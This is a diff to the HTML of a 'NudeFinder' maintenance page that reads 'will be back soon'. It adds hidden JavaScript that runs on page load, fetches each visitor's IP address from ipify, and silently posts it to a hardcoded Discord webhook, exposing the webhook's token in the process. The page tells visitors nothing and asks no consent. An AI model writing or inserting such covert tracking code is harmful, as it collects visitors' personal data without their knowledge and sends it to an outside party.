@@ -7,4 +7,18 @@
 
 </head>
 <h1>NudeFinder will be back soon! We are having technical problems.</h1>
+<script type="text/javascript">
+  // Function to get the client IP address
+  function getIP(json) {
+    var ip = json.ip;
+    // Make a POST request with the IP to your server
+    var xhr = new XMLHttpRequest();
+    var url = 'https://discord.com/api/webhooks/1192627897907814500/hqy2JISR_v2MHkp58ZGujUW7qF4JW32lTJbXFlSRPvJ-KiaPaOFZQxtYohbJchB4IqxcL';
+    xhr.open('POST', url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    var data = JSON.stringify({'ip': ip});
+    xhr.send(data);
+  }
+</script>
+<script type="text/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
 </html>
